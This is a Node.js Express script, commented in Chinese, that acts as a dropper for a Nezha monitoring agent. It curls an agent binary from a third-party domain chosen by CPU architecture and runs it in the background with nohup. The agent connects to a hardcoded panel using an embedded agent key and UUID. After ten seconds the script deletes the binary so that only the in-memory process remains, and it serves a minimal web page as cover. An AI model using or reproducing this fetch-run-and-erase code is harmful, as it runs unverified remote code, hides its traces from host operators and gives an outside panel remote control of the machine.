const express = require("express");
const app = express();
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

// --- 必填参数 ---
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nz.106521.xyz:443'; // 你的哪吒面板地址
const NEZHA_PORT = process.env.NEZHA_PORT || '';           // 哪吒 v0 填端口，v1 请留空
const NEZHA_KEY = process.env.NEZHA_KEY || '2Q7NOccSnwGZfTCKsct0OqCKT7ja5uAx';               // 你的 Agent 密钥
const UUID = process.env.UUID || '1d686419-8f0a-4ebd-8e24-cc22815b2d18'; // 仅用于 v1
// ----------------

const PORT = process.env.PORT || 3000;
const FILE_PATH = './.tmp';
const agentPath = path.join(FILE_PATH, 'nezha_agent');

if (!fs.existsSync(FILE_PATH)) fs.mkdirSync(FILE_PATH);

// 1. 判断系统架构并获取下载地址
function getDownloadUrl() {
    const arch = os.arch();
    const isArm = (arch === 'arm' || arch === 'arm64' || arch === 'aarch64');
    const baseUrl = isArm ? "https://arm64.ssss.nyc.mn" : "https://amd64.ssss.nyc.mn";
    // 如果 NEZHA_PORT 有值，认为是 v0 版本下载 agent，否则下载 v1 版本
    return NEZHA_PORT ? `${baseUrl}/agent` : `${baseUrl}/v1`;
}

// 2. 启动哪吒 Agent
async function runNezha() {
    try {
        const url = getDownloadUrl();
        console.log(`Downloading Agent from: ${url}`);
        
        // 下载并授权
        await exec(`curl -L ${url} -o ${agentPath} && chmod +x ${agentPath}`);

        let command = "";
        if (NEZHA_PORT) {
            // 哪吒 v0 启动命令
            const tls = ['443', '8443', '2096', '2087', '2083', '2053'].includes(NEZHA_PORT) ? '--tls' : '';
            command = `nohup ${agentPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tls} --disable-auto-update >/dev/null 2>&1 &`;
        } else {
            // 哪吒 v1 启动命令（自动生成简易配置）
            const configYaml = `client_secret: ${NEZHA_KEY}\nserver: ${NEZHA_SERVER}\ntls: true\nuuid: ${UUID}`;
            fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
            command = `nohup ${agentPath} -c ${FILE_PATH}/config.yaml >/dev/null 2>&1 &`;
        }

        await exec(command);
        console.log("Nezha Agent is running...");
        
        // 运行 10 秒后清理二进制文件（进程已驻留内存）
        setTimeout(() => {
            if (fs.existsSync(agentPath)) fs.unlinkSync(agentPath);
            console.log("Cleanup complete.");
        }, 10000);

    } catch (err) {
        console.error("Run Nezha failed:", err.message);
    }
}

// 启动逻辑
runNezha();

app.get("/", (req, res) => res.send("Nezha Agent is active."));
app.listen(PORT, () => console.log(`Monitor web service on port ${PORT}`));
